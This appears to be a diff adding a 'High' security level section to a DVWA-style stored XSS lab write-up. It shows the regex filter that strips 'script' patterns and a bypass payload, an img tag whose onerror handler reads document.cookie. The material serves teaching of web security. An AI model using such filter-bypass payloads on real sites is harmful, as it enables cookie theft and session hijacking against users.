@@ -39,4 +39,17 @@ This will successfully carry out the stored XSS injection.
 
 ## Security Level = High
 
+In this level, the developers have added additional input sanitization to the name field. 
 
+```bash
+$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
+```
+This removes any pattern resembling to `script` and replace them null ''.
+
+Attackers can bypass this by crafting input tags other than script.
+
+```bash
+<img src/onerror=alert(document.cookie)>
+```
+
+![image](https://github.com/user-attachments/assets/29a37cac-0f5a-4a07-8c08-387b66b5a966)
